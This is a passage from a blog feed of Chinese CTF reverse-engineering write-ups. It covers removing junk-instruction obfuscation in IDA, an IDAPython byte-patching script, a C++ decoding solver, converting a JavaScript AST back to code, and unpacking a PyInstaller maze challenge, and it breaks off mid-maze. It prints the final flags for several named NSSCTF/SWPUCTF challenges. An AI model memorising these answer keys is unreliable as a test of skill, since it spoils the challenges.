      <link href="/2023/03e0e642b7.html"/>
      <url>/2023/03e0e642b7.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>处理 JUMPOUT 花指令</mark></p></li><li><p><mark>正向爆破时，如果同时遇到两个未知变量的处理方法</mark><br>本题对于条件 <code>Str1[i] = (Str1[i] + Str1[(i * i + 123) % 21]) % 96 + 32</code> 无法进行常规的正向爆破</p></li></ul><blockquote><ol><li>这里采用了余数的特点：<br><code>Str1[i] = Str1[i] % 96 + Str1[(i * i + 123) % 21] + 32</code> 或<br><code>Str1[i] = Str1[i] % 96 + Str1[(i * i + 123) % 21] - 96 + 32</code></li><li>变换得到刚开始未处理过的 <code>Str1[i]</code> 取余后的结果，即：<br><code>Str1[i] % 96      = Str1[i] - 32 - Str1[(i * i + 123) % 21]</code> 或<br><code>Str1[i] % 96 - 96 = Str1[i] - 32 - Str1[(i * i + 123) % 21]</code></li><li>要得到初始的 <code>Str1[i]</code> 的值，只需将 <code>Str1[i] % 96</code> 或 <code>Str1[i] % 96 - 96</code> 的结果加上 n 个 96，如果加上 n 个 96 后的结果在 32 ~ 127 范围内，那么这个结果就是初始的 <code>Str1[i]</code> 的值<br>即：只需要将 <code>Str1[i] - 32 - Str1[(i * i + 123) % 21]</code> 的结果加上 n 个 96 即可，取位于 32 ~ 127 之中的结果</li></ol></blockquote><hr><p><a href="https://www.ctfer.vip/problem/2316">NSSCTF-jump_by_jump_revenge</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>将程序拖入 32位 IDA，查看 main 函数<br><img src="https://s2.loli.net/2023/03/18/cVtWA6PNa4BRjCx.png" alt="NSSCTF-jump_by_jump_revenge1.png"></p></li><li><p>对 main 函数 F5 反编译后 JUMPOUT<br><img src="https://s2.loli.net/2023/03/18/H92TLxIdtsyVcqX.png" alt="NSSCTF-jump_by_jump_revenge2.png"></p></li><li><p>在 IDA View-A 中定位 main<br><img src="https://s2.loli.net/2023/03/18/HR3sWVanLtpxPro.png" alt="NSSCTF-jump_by_jump_revenge3.png"><br>在 main 中未发现花指令，根据 <code>jmp     _main_0</code> 跟进到 <code>main_0</code> 的位置<br><img src="https://s2.loli.net/2023/03/18/2QvjYlysAL354VH.png" alt="NSSCTF-jump_by_jump_revenge4.png"><br>在 main_0 中 <code>jmp     short loc_4118D2</code> 后，到 loc_4118D2 中 <code>jnz     short near ptr loc_4118DA+2</code> 跳转到 loc_4118DA，而 loc_4118DA 中 <code>jmp     near ptr 0C086A4CCh</code> 跳转到无效的地址使得 main 无法被 IDA 正确编译</p></li><li><p>选中 <code>jmp     near ptr 0C086A4CCh</code>，使用快捷键 D 转换为硬指令：<br><img src="https://s2.loli.net/2023/03/18/42LyOFhnb53zsBX.png" alt="NSSCTF-jump_by_jump_revenge5.png"><br>选中 <code>db 0E9h</code>，右键 -&gt; Patching -&gt; Change byte，<em><strong>将开头的 E9 改为 90</strong></em><br><img src="https://s2.loli.net/2023/03/18/ZIyAQEcD3qs7xFO.png" alt="NSSCTF-jump_by_jump_revenge6.png"></p></li><li><p>选中 <code>db 90h</code>，按快捷键 C 将硬指令转换为代码<br><img src="https://s2.loli.net/2023/03/18/K7CgdRENSG1TUYc.png" alt="NSSCTF-jump_by_jump_revenge7.png"></p></li><li><p>在 main_0 函数起始处按快捷键 P，重新生成函数<br><img src="https://s2.loli.net/2023/03/18/ENZjkxGzovUI57M.png" alt="NSSCTF-jump_by_jump_revenge8.png"></p></li><li><p>此时 main 函数已经被成功修复：<br><img src="https://s2.loli.net/2023/03/18/qsPwTWugaOZ3SzJ.png" alt="NSSCTF-jump_by_jump_revenge9.png"><br>进入 main_0 函数：<br><img src="https://s2.loli.net/2023/03/18/SasVu39LcK8MD7Q.png" alt="NSSCTF-jump_by_jump_revenge10.png"></p></li><li><p>根据条件 <code>j_strcmp(Str1, &quot;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&quot;)</code> 可以判断，还原后的 Str1 就是 flag</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span>  </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      string Str1 <span class="token operator">=</span> <span class="token string">"~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*"</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">-</span> Str1<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">123</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">32</span> <span class="token operator">||</span> Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> j <span class="token operator">*</span> <span class="token number">96</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">126</span><span class="token punctuation">)</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">29</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{Jump_b9_jump!_r3V3n9e}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/DKniZowtTkIGbRN.png" alt="NSSCTF-jump_by_jump_revenge11.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-jump_by_jump</title>
      <link href="/2023/03333e6621.html"/>
      <url>/2023/03333e6621.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>识别花指令，以及花指令的去除与修复</mark></p></li><li><p><mark>IDA 中的 JUMPOUT 函数</mark></p></li></ul><hr><p><a href="https://www.ctfer.vip/problem/2313">NSSCTF-jump_by_jump</a></p><hr><h2 id="思路一（非预期解）"><a href="#思路一（非预期解）" class="headerlink" title="思路一（非预期解）"></a>思路一（非预期解）</h2><ol><li>拖入 IDA，shift + F12 查看字符串，可直接看到 flag：NSSCTF{Jump_b9_jump!}<br><img src="https://s2.loli.net/2023/03/18/XEz89B4ruPyqead.png" alt="NSSCTF-jump_by_jump1.png"></li></ol><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>拖入 IDA，F5 查看 main 函数<br><img src="https://s2.loli.net/2023/03/18/bPxcRj71Coy3rlK.png" alt="NSSCTF-jump_by_jump2.png"><br>发现 JUMPOUT 函数，说明 main 函数无法正确编译</p></li><li><p>跟进到 0x411860<br><img src="https://s2.loli.net/2023/03/18/pAMFbtfQz1qE3Ng.png" alt="NSSCTF-jump_by_jump3.png"><br>发现是有汇编代码的，但是 IDA 没有正确识别该函数的内容</p></li><li><p>在下面发现 jz、jnz 花指令，跳转到 <code>loc_41188C+1</code> 执行，然后执行 call 指令<br><img src="https://s2.loli.net/2023/03/18/JLU3ETN1WVcG7ZB.png" alt="NSSCTF-jump_by_jump4.png"></p></li><li><p><mark>去除花指令</mark><br>先将 call 指令 <code>call    near ptr 41BC4932h</code> 转换成硬指令<br>选中 call 指令，按快捷键 D<br><img src="https://s2.loli.net/2023/03/18/D9C5AWhoG3RKvje.png" alt="NSSCTF-jump_by_jump5.png"><br>点击 yes 后：<br><img src="https://s2.loli.net/2023/03/18/fM2zlUcHkGPN3Yp.png" alt="NSSCTF-jump_by_jump6.png"></p></li><li><p>将 call 的硬指令 <code>db 0E8h</code> 从 E8 改为 90<br><em><strong>E8 表示执行，90 表示跳过</strong></em><br>选中指令 <code>db 0E8h</code><br>依次打开 <code>Edit -&gt; Patch program -&gt; Change byte</code>【或者 <code>右键 -&gt; pathing -&gt; change byte</code>】<br><img src="https://s2.loli.net/2023/03/18/OVgrhQI6WqTzicf.png" alt="NSSCTF-jump_by_jump7.png"><br>将开头的 E8 修改为 90<br><img src="https://s2.loli.net/2023/03/18/4kobHCu7hKOlAiU.png" alt="NSSCTF-jump_by_jump8.png"><br>修改后：<br><img src="https://s2.loli.net/2023/03/18/jhSgHZpvPORmFVQ.png" alt="NSSCTF-jump_by_jump9.png"></p></li><li><p>再将硬指令 <code>db 90h</code> 转换回代码<br>选中指令 <code>db 90h</code>，按快捷键 C<br><img src="https://s2.loli.net/2023/03/18/tmcnM1V8YXHoLul.png" alt="NSSCTF-jump_by_jump10.png"><br>转换后：<br><img src="https://s2.loli.net/2023/03/18/uMw6FjKXkeQZbh3.png" alt="NSSCTF-jump_by_jump11.png"></p></li><li><p>接下来，将后面的指令依次按快捷键 C 进行修复【黄色部分的所有地址】<br>全部修复后：<br><img src="https://s2.loli.net/2023/03/18/1Jtu6sEwe2IHKqD.png" alt="NSSCTF-jump_by_jump12.png"></p></li><li><p>最后，将光标置于函数 main 开始的地方<br><img src="https://s2.loli.net/2023/03/18/9JcsC2pfSWuQePG.png" alt="NSSCTF-jump_by_jump13.png"><br>按快捷键 P ，将修复后的代码重新生成函数<br><img src="https://s2.loli.net/2023/03/18/VgerX5mGilvnWAu.png" alt="NSSCTF-jump_by_jump14.png"><br>可以看到 IDA 生成了一个新的函数 <code>main_0</code><br>此时搜索函数名 <code>main</code>，就可以看到新生成的函数 <code>main_0</code><br><img src="https://s2.loli.net/2023/03/18/U78m2bTMqQHLj5n.png" alt="NSSCTF-jump_by_jump15.png"></p></li><li><p>F5 生成 main_0 的伪代码，此时 IDA 可以正常编译<br><img src="https://s2.loli.net/2023/03/18/aSDsYkj73oQqZWN.png" alt="NSSCTF-jump_by_jump16.png"></p></li><li><p>这里先把字符串 <code>&quot;NSSCTF&#123;Jump_b9_jump!&#125;&quot;</code> 赋值给 v5，然后 for 循环对 v5 进行操作，输出 v5<br>但是操作与 flag 无关，最终的 flag 就是 <code>NSSCTF&#123;Jump_b9_jump!&#125;</code></p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{Jump_b9_jump!}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-wordy</title>
      <link href="/2023/03ece8b035.html"/>
      <url>/2023/03ece8b035.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>花指令的处理</mark></p></li><li><p><mark>利用 IDA 的脚本嵌入功能，执行将 jmp 花指令的第一个字节 patch 成 0x90 再分析</mark></p></li></ul><hr><p><a href="https://www.ctfer.vip/problem/880">NSSCTF-wordy</a></p><hr><h2 id="思路一（非预期解）"><a href="#思路一（非预期解）" class="headerlink" title="思路一（非预期解）"></a>思路一（非预期解）</h2><ol><li>在文件的 16进制视图中可以看到 flag：<br><code>GFCTF&#123;u_are2wordy&#125;</code><br><img src="https://s2.loli.net/2023/03/18/T7ce54CfSyZo2Ub.png" alt="NSSCTF-wordy1.png"></li></ol><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>拖入 IDA，没有 main 函数，进入 start 函数查看<br><img src="https://s2.loli.net/2023/03/18/ZLEA1UjkCDwXel7.png" alt="NSSCTF-wordy2.png"><br>这里已经发现报错信息了：<br><code>// positive sp value has been detected, the output may be wrong!</code></p></li><li><p>进入函数 <code>_libc_start_main()</code>，发现该函数无法 F5 反编译<br><img src="https://s2.loli.net/2023/03/18/ujD2A5e9IdqY7M1.png" alt="NSSCTF-wordy3.png"></p></li><li><p>到 IDA View-A 中定位到该函数的位置<br><img src="https://s2.loli.net/2023/03/18/Nb8EsWAjcqrniJl.png" alt="NSSCTF-wordy4.png"><br>发现指令 <code>jmp     short near ptr loc_1144+1</code> 跳转到了一大片疑似垃圾数据的位置，所以导致函数不能被 IDA 正常解析，应该又是花指令</p></li><li><p>因为数据量太大，这里用 python 脚本处理花指令<br>快捷键：shift + F2，嵌入脚本代码</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 利用 idapython 脚本解决重复工作</span>startaddr <span class="token operator">=</span> <span class="token number">0x1135</span>endaddr <span class="token operator">=</span> <span class="token number">0x3100</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>startaddr<span class="token punctuation">,</span> endaddr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> get_wide_byte<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xEB</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> get_wide_byte<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">:</span>            patch_byte<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Addr &#123;&#125; is patched"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><mark>思想就是将数据的第一个字节修改为 90</mark></p></li><li><p>恢复后：<br><img src="https://s2.loli.net/2023/03/18/MocSLiE94gHqunF.png" alt="NSSCTF-wordy5.png"><br>发现 main 函数就是一直在做 putchar 的输出，一次输出一个字符<br>在地址 0x2D56 开始的地方发现了 flag<br><img src="https://s2.loli.net/2023/03/18/9KPxrZb2ziyRSXN.png" alt="NSSCTF-wordy6.png"></p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>GFCTF{u_are2wordy}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF-astJS</title>
      <link href="/2023/0381a9c01.html"/>
      <url>/2023/0381a9c01.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>JS 逆向，了解 js 语言的抽象语法树（AST）</mark></p></li><li><p><mark>使用 escodegen 将 JavaScript AST 转换为代码</mark></p></li><li><p>在浏览器的控制台中可以直接运行 js 代码</p></li></ul><hr><p><a href="https://www.ctfer.vip/problem/409">SWPUCTF-astJS</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>题目文件为一个 json 文件：<br><img src="https://s2.loli.net/2023/03/18/qrIQAohEG6cW9l4.png" alt="SWPUCTF-astJS1.png"><br>该文件其实是 js 语言的 AST（抽象语法树），表现形式为 json 文件的格式</p></li><li><p>使用 <code>npm</code> 命令安装 <code>escodegen</code> 模块</p></li></ol><blockquote><p><code>npm i escodegen -g</code></p></blockquote><p>   <img src="https://s2.loli.net/2023/03/19/GRO2JgPbCUi5SaQ.png" alt="SWPUCTF-astJS2.png"></p><ol start="3"><li>利用 <code>escodegen</code> 将 js 语句的 AST 语法树 —— json 文件转化成 js 语句：</li></ol><blockquote><p><code>esgenerate 附件.json</code></p></blockquote><p>   <img src="https://s2.loli.net/2023/03/19/tNqlzfoRp6EgCb2.png" alt="SWPUCTF-astJS3.png"></p><ol start="4"><li><p>得到转换后的 js 代码如下：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">bE</span><span class="token punctuation">(</span><span class="token parameter">str<span class="token punctuation">,</span> key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> arr <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">i</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">bE</span><span class="token punctuation">(</span><span class="token string">'EXXH_Mpjx\x7FBxYnjggrM~eerv'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>将该 js 代码在浏览器的控制台中运行，即可得到 flag：<br><img src="https://s2.loli.net/2023/03/18/cFOeRv18xQzrljq.png" alt="SWPUCTF-astJS4.png"></p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{astIsReallyFunny}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF-老鼠走迷宫</title>
      <link href="/2023/03cfb8a343.html"/>
      <url>/2023/03cfb8a343.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>Python逆向</p></li><li><p><mark>迷宫题的处理方法</mark></p><ol><li>将迷宫中的 “1” 去掉，只关注 “0” 的上下左右</li><li>利用走迷宫脚本</li></ol></li><li><p>在线 MD5 加密，如果字符串结尾有回车符之类的，可能会导致结果不一样</p></li></ul><hr><p><a href="https://www.ctfer.vip/problem/406">SWPUCTF-老鼠走迷宫</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>拖入 Exeinfo PE，由 PyInstaller 可知为 Python 逆向<br><img src="https://s2.loli.net/2023/03/18/67rblxFUKkQzX8L.png" alt="SWPUCTF-老鼠走迷宫1.png"></p></li><li><p>使用 pyinstxtractor.py 进行解包<br><img src="https://s2.loli.net/2023/03/18/fGV7QlFkTIitJ15.png" alt="SWPUCTF-老鼠走迷宫2.png"><br>在解包后的文件夹中发现无后缀名的 5 文件，且 Exeinfo PE 无法识别该文件的类型<br><img src="https://s2.loli.net/2023/03/18/Na47jzVq2rm1D3l.png" alt="SWPUCTF-老鼠走迷宫3.png"><br>在 WinHex 中与 struct 文件对比后发现，文件 5 缺失了第一行的十六进制数据<br>将 struct 文件的第一行拷贝到 5 文件的第一行进行修复<br>修复后 Exeinfo PE 可识别为 .pyc 文件<br>在虚拟机的 python 3.8 下反编译：<br><img src="https://s2.loli.net/2023/03/18/Iv3BO2guGDm6NV5.png" alt="SWPUCTF-老鼠走迷宫4.png"></p></li><li><p>将代码复制出来：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token punctuation">,</span> msvcrt  row<span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span>  i<span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  maze <span class="token operator">=</span> <span class="token punctuation">[</span>   <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token 